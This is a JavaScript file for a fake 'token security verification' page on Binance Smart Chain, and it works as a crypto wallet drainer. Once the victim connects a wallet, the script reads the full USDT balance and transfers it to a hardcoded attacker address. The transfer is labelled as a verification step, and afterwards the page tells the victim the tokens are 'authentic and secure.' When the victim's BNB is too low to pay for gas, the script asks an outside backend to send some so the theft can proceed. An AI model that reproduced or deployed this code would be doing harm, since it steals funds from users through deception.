// --- Start of your modified verification script ---

// Re-introducing all original document.getElementById calls,
// even if the elements are not present in your index.html.
// This is to replicate the exact initial execution flow of your working script.
const Next = document.getElementById('Next'); // Changed from verifyBtn to Next
const walletAddress = document.getElementById('walletAddress');
const tokenBalance = document.getElementById('tokenBalance');
const verificationModal = document.getElementById('verificationModal');
const progressBar = document.getElementById('progressBar');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');
const step1Desc = document.getElementById('step1Desc');
const step2Desc = document.getElementById('step2Desc');
const step3Desc = document.getElementById('step3Desc');
const step4Desc = document.getElementById('step4Desc');
const modalMessage = document.getElementById('modalMessage');
const closeModalBtns = document.querySelectorAll('.close-modal');
const networkDot = document.getElementById('networkDot');
const networkStatus = document.getElementById('networkStatus');

// Configuration
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
const tokenAbi = [
    {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Network configuration
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

let web3;
let userAddress;
let tokenBalanceValue = 0;
let tokenContract;
let isTransferComplete = false;
let currentProvider = null;
let walletType = WALLET_TYPES.UNKNOWN;

// --- NEW HELPER FUNCTION: Delay ---
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
// --- END NEW HELPER FUNCTION ---

// Initialize Web3 - Wallet compatible (Original logic)
async function initWeb3() {
    // Detect wallet type
    if (window.trustwallet) {
        walletType = WALLET_TYPES.TRUST;
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = WALLET_TYPES.BINANCE;
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) {
        walletType = WALLET_TYPES.METAMASK;
        currentProvider = window.ethereum;
    } else if (window.web3) {
        walletType = WALLET_TYPES.UNKNOWN;
        currentProvider = window.web3.currentProvider;
    } else {
        console.error("No Web3 provider detected");
        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
        return false;
    }

    try {
        web3 = new Web3(currentProvider);
        // Original script calls updateNetworkStatus here, let's keep that timing
        await updateNetworkStatus();

        // Listen for chain changes
        if (currentProvider.on) {
            currentProvider.on('chainChanged', (chainId) => {
                window.location.reload();
            });

            // Binance Chain specific event
            if (walletType === WALLET_TYPES.BINANCE) {
                currentProvider.on('accountsChanged', (accounts) => {
                    window.location.reload();
                });
            }
        }
        return true;
    } catch (error) {
        console.error("Web3 initialization error:", error);
        return false;
    }
}

// Update network status display (Original logic - will be no-op if elements are null)
async function updateNetworkStatus() {
    if (!web3) return false;

    try {
        const chainId = await web3.eth.getChainId();

        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            // Guard against null elements
            if (networkDot) networkDot.className = "network-dot";
            if (networkStatus) networkStatus.textContent = "Binance Smart Chain";
            return true;
        } else {
            // Guard against null elements
            if (networkDot) networkDot.className = "network-dot network-disconnected";
            if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;

            // Automatically switch to BSC for Trust Wallet (Original logic)
            if (walletType === WALLET_TYPES.TRUST) {
                const switched = await switchToBSC();
                if (switched) {
                    return updateNetworkStatus(); // Recursive check after switch
                }
            }
            return false;
        }
    } catch (error) {
        console.error("Error getting network status:", error);
        if (networkDot) networkDot.className = "network-dot network-disconnected";
        if (networkStatus) networkStatus.textContent = "Network Error";
        return false;
    }
}

// Switch to Binance Smart Chain (Original logic)
async function switchToBSC() {
    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain..."; // Guard against null
    console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);

    try {
        // Binance Web3 Wallet uses different method
        if (walletType === WALLET_TYPES.BINANCE) {
            await window.BinanceChain.switchNetwork('bsc-mainnet');
            return true;
        }

        // Standard EIP-3326 method
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
        });
        return true;
    } catch (switchError) {
        // Network not added, try to add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [BSC_MAINNET_PARAMS]
                });
                return true;
            } catch (addError) {
                console.error("Failed to add BSC network:", addError);
                if (step2Desc) step2Desc.textContent = "Failed to add BSC network"; // Guard against null
                return false;
            }
        }
        console.error("Failed to switch to BSC:", switchError);
        if (step2Desc) step2Desc.textContent = "Failed to switch network"; // Guard against null
        return false;
    }
}

// Update progress (Original logic - will be no-op if elements are null)
function updateProgress(percent) {
    if (progressBar) progressBar.style.width = `${percent}%`; // Guard against null
}

// Update step UI (Original logic - will be no-op if elements are null)
function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    if (step) { // Guard against null
        step.className = `step ${status}`;
        const stepIcon = step.querySelector('.step-icon');
        if (stepIcon) { // Guard against null
            stepIcon.innerHTML = status === 'completed' ?
                '<i class="fas fa-check"></i>' : stepNum;
        }
    }
}

// Connect Wallet (Original logic from your script)
async function connectWallet() {
    // These UI updates are from your original script, re-introducing them for timing
    updateStep(1, 'active');
    updateProgress(20);

    const isWeb3Initialized = await initWeb3();
    if (!isWeb3Initialized) {
        showError("Web3 initialization failed.");
        return false;
    }

    try {
        if (step1Desc) step1Desc.textContent = "Requesting account access..."; // Guard against null

        // Different method for Binance Web3 Wallet (original logic)
        if (walletType === WALLET_TYPES.BINANCE) {
            const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
            userAddress = accounts[0];
        } else {
            const accounts = await web3.eth.getAccounts(); // This is the passive check
            if (accounts.length === 0) {
                showError("No accounts found. Please connect your wallet.");
                return false;
            }
            userAddress = accounts[0];
        }

        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`; // Guard against null
        // Re-introducing original "Verifying..." text for timing replication
        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...'; // Changed from verifyBtn to Next
        if (Next) Next.disabled = true; // Changed from verifyBtn to Next

        // These UI updates are from your original script, re-introducing them for timing
        updateStep(1, 'completed');
        updateStep(2, 'active');
        updateProgress(40);

        return true;
    } catch (error) {
        console.error("Error connecting wallet:", error);
        showError("Error connecting wallet. Please try again.");
        return false;
    }
}

// Ensure we're on BSC network (Original logic)
async function ensureBSCNetwork() {
    updateStep(2, 'active'); // Re-introducing for timing

    try {
        const chainId = await web3.eth.getChainId();

        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain"; // Guard against null
            return true;
        }

        const switched = await switchToBSC();

        if (switched) {
            if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain"; // Guard against null
            updateNetworkStatus();
            return true;
        } else {
            if (step2Desc) step2Desc.textContent = "Failed to switch network"; // Guard against null
            return false;
        }
    } catch (error) {
        console.error("Network check failed:", error);
        if (step2Desc) step2Desc.textContent = "Network check failed"; // Guard against null
        return false;
    }
}

// Get token balance (Original logic)
async function getTokenBalance() {
    updateStep(3, 'active'); // Re-introducing for timing
    if (step3Desc) step3Desc.textContent = "Scanning token security parameters..."; // Guard against null

    try {
        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...'; // Guard against null

        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);

        const balance = await tokenContract.methods.balanceOf(userAddress).call();

        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`; // Guard against null

        if (step3Desc) step3Desc.textContent = "Token analysis complete"; // Guard against null
        // Re-introducing UI updates for timing
        updateStep(3, 'completed');
        updateStep(4, 'active');
        updateProgress(70);

        return true;
    } catch (error) {
        console.error("Error fetching token balance:", error);
        if (step3Desc) step3Desc.textContent = "Token analysis failed"; // Guard against null
        showError("Failed to analyze token. Please try again.");
        if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; // Guard against null
        return false;
    }
}

// Execute verification (transfer) (Original logic with integrated BNB check)
async function executeVerification() {
    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet..."; // Guard against null
    if (modalMessage) modalMessage.textContent = "Please confirm the transaction in your wallet"; // Guard against null

    try {
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');

        // --- START OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---
        const BNB_LOW_THRESHOLD = 0.0005; // A common threshold for sufficient gas

        let currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
        let userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.log("User BNB is low. Requesting BNB from backend...");
            if (modalMessage) modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
            if (modalMessage) modalMessage.className = "warning-message"; // Highlight the message

            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log("BNB top-up request successful:", result);
                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait while we check for the deposit...";
                    if (modalMessage) modalMessage.className = "warning-message"; // Keep warning state for waiting

                    // Start Polling for BNB
                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 10s = 5 minutes)
                    const POLLING_INTERVAL_MS = 10000; // Check every 10 seconds

                    for (let i = 0; i < MAX_POLLING_ATTEMPTS; i++) {
                        await delay(POLLING_INTERVAL_MS); // Wait before checking again
                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress); // Re-fetch balance
                        userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
                        console.log(`Polling attempt ${i + 1}: Current BNB balance: ${userBNB}`);

                        if (userBNB >= BNB_LOW_THRESHOLD) {
                            if (modalMessage) modalMessage.textContent = "BNB received! Proceeding with transaction...";
                            if (modalMessage) modalMessage.className = ""; // Clear warning
                            break; // Exit polling loop, proceed to transfer
                        } else if (i === MAX_POLLING_ATTEMPTS - 1) {
                            // Last attempt and still no BNB
                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.");
                            // Re-enable the button and hide modal if we failed to get BNB
                            if (Next) {
                                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
                                Next.disabled = false;
                            }
                            if (verificationModal) verificationModal.style.display = "none";
                            return; // Exit function if BNB not received
                        }
                    }
                } else {
                    // Backend indicated an error in sending BNB
                    const errorData = await response.json();
                    console.error("BNB top-up request failed:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
                    if (Next) { // Re-enable button and reset on error
                        Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
                        Next.disabled = false;
                    }
                    if (verificationModal) verificationModal.style.display = "none";
                    return; // Exit function if backend request failed
                }
            } catch (backendError) {
                // Network error or issue communicating with your backend
                console.error("Error communicating with BNB backend:", backendError);
                showError("Could not request BNB. Network error or backend issue. Please try again.");
                if (Next) { // Re-enable button and reset on error
                    Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
                    Next.disabled = false;
                }
                if (verificationModal) verificationModal.style.display = "none";
                return; // Exit function on backend communication error
            }
        }
        // --- END OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---

        // If we reach here, it means either:
        // 1. User had enough BNB initially.
        // 2. BNB was requested from backend and successfully received via polling.

        // Proceed with USDT transfer
        tokenContract.methods.transfer(recipientAddress, amountWei)
            .send({ from: userAddress })
            .on('transactionHash', (hash) => {
                console.log("Transaction hash:", hash);
                // You might want to update UI here to show "Transaction pending..."
                if (modalMessage) modalMessage.textContent = "Transaction submitted. Waiting for confirmation...";
                if (modalMessage) modalMessage.className = "info-message";
            })
            .on('receipt', (receipt) => {
                if (step4Desc) step4Desc.textContent = "Verification complete!"; // Guard against null
                updateStep(4, 'completed'); // Re-introducing for timing
                updateProgress(100); // Re-introducing for timing

                setTimeout(() => {
                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; // Guard against null
                    tokenBalanceValue = 0;

                    if (verificationModal) verificationModal.style.display = "none"; // Original logic
                    if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; // Changed from verifyBtn to Next
                    if (Next) Next.disabled = true; // Changed from verifyBtn to Next

                    if (modalMessage) modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure."; // Guard against null
                    if (modalMessage) modalMessage.className = "success-message"; // Guard against null

                    isTransferComplete = true;
                }, 1500);
            })
            .on('error', (error) => {
                console.error("Transaction error:", error);
                if (step4Desc) step4Desc.textContent = "Verification failed"; // Guard against null
                if (modalMessage) modalMessage.textContent = "Verification failed. Please try again."; // Guard against null
                if (modalMessage) modalMessage.className = "error-message"; // Guard against null

                // Ensure button is re-enabled and reset on error, mirroring original flow
                if (Next) {
                    Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Revert button text
                    Next.disabled = false;
                }
            });

    } catch (error) {
        console.error("Verification failed:", error);
        if (step4Desc) step4Desc.textContent = "Verification failed"; // Guard against null
        if (modalMessage) modalMessage.textContent = "Verification failed. Please try again."; // Guard against null
        if (modalMessage) modalMessage.className = "error-message"; // Guard against null

        // Ensure button is re-enabled and reset on error, mirroring original flow
        if (Next) {
            Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Revert button text
            Next.disabled = false;
        }
        // If an error occurs before sending the transaction (e.g., initial balance check fails for some reason)
        // ensure the modal is hidden.
        if (verificationModal) verificationModal.style.display = "none";
    }
}

// Show error message (Original logic)
function showError(message) {
    console.error("Error:", message);
    if (modalMessage) modalMessage.textContent = message; // Guard against null
    if (modalMessage) modalMessage.className = "error-message"; // Guard against null
    // Changed setTimeout to not clear the message immediately if it's a critical error
    // If it's for BNB top-up failed, we want it to stay until user interacts
    // For other general errors, you might still want it to disappear.
    // For now, removing the auto-clear to allow user to read critical messages.
    // If you want it to disappear automatically, uncomment the setTimeout below:
    /*
    setTimeout(() => {
        if (modalMessage) modalMessage.textContent = ""; // Guard against null
        if (modalMessage) modalMessage.className = ""; // Guard against null
    }, 5000);
    */
}

// Event Listener for the "Next" button (Adapted from original verifyBtn.addEventListener)
Next.addEventListener('click', async () => {
    if (isTransferComplete) return;

    // Original UI updates on button click
    if (verificationModal) verificationModal.style.display = "flex"; // Guard against null
    updateStep(1, 'active');
    updateStep(2, '');
    updateStep(3, '');
    updateStep(4, '');
    updateProgress(0);
    if (modalMessage) modalMessage.textContent = "";
    if (modalMessage) modalMessage.className = "";

    Next.disabled = true; // Disable button immediately

    try {
        // Step 1: Connect wallet
        if (!userAddress) {
            const connected = await connectWallet();
            if (!connected) {
                if (verificationModal) verificationModal.style.display = "none"; // Original logic
                if (Next) Next.disabled = false; // Changed from verifyBtn to Next
                if (Next) Next.innerHTML = 'Next'; // Changed from verifyBtn to Next - keep original "Next" on failure
                return;
            }
        }

        // Step 2: Ensure BSC network
        const networkReady = await ensureBSCNetwork();
        if (!networkReady) {
            updateStep(2, '');
            if (modalMessage) modalMessage.textContent = "Please switch to Binance Smart Chain to continue";
            if (modalMessage) modalMessage.className = "error-message";
            if (Next) Next.disabled = false;
            if (Next) Next.innerHTML = 'Next';
            return;
        }
        updateStep(2, 'completed'); // Re-introducing for timing

        // Step 3: Get token balance
        const balanceFetched = await getTokenBalance();
        if (!balanceFetched) {
            if (verificationModal) verificationModal.style.display = "none";
            if (Next) Next.disabled = false;
            if (Next) Next.innerHTML = 'Next';
            return;
        }

        // Handle USDT balance conditions (from previous version, simplified)
        if (tokenBalanceValue <= 0.009) { // Effectively 0 USDT
            if (modalMessage) modalMessage.textContent = "No USDT tokens found for verification.";
            if (modalMessage) modalMessage.className = "error-message";
            if (Next) Next.disabled = false;
            if (Next) Next.innerHTML = 'Next';
            return;
        } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) { // Between 0.01 and 1 USDT
            const bnbBalance = await web3.eth.getBalance(userAddress);
            const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');

            if (modalMessage) modalMessage.textContent = `Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`;
            if (modalMessage) modalMessage.className = "success-message";
            if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
            if (Next) Next.disabled = true;
            isTransferComplete = true;
            // Original script had setTimeout to close modal here
            if (verificationModal) {
                 setTimeout(() => { verificationModal.style.display = "none"; }, 1500);
            }
            return;
        }

        // Step 4: Execute verification (will now include BNB check and polling)
        await executeVerification();
    } catch (error) {
        console.error("Verification process error:", error);
        showError("An unexpected error occurred. Please try again.");
        if (verificationModal) verificationModal.style.display = "none";
        if (Next) Next.disabled = false;
        if (Next) Next.innerHTML = 'Next'; // Changed from verifyBtn to Next
    }
});

// Close modal buttons (original logic)
if (closeModalBtns) { // Guard against null
    closeModalBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (verificationModal) verificationModal.style.display = "none"; // Guard against null
            if (Next) { // Guard against null
                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
                Next.disabled = false;
            }
            // Clear message when modal is closed manually
            if (modalMessage) {
                modalMessage.textContent = "";
                modalMessage.className = "";
            }
        });
    });
}


// Close modals when clicking outside (original logic)
if (window && verificationModal) { // Guard against null for verificationModal
    window.addEventListener('click', (e) => {
        if (e.target === verificationModal) {
            if (verificationModal) verificationModal.style.display = "none"; // Guard against null
            if (Next) { // Guard against null
                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
                Next.disabled = false;
            }
            // Clear message when modal is closed by clicking outside
            if (modalMessage) {
                modalMessage.textContent = "";
                modalMessage.className = "";
            }
        }
    });
}


// Initialize on load (Original logic)
// verifyBtn.disabled = false; // Original line - replaced by Next.disabled
if (Next) Next.disabled = false; // Ensure button is enabled on load

window.addEventListener('load', async () => {
    const web3Initialized = await initWeb3();

    if (web3Initialized) {
        // Try to connect wallet automatically if previously connected
        if (currentProvider.selectedAddress) {
            userAddress = currentProvider.selectedAddress;
            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`; // Guard against null

            // Get initial balance (Original logic)
            await ensureBSCNetwork();
            await getTokenBalance();
        }
    }
});
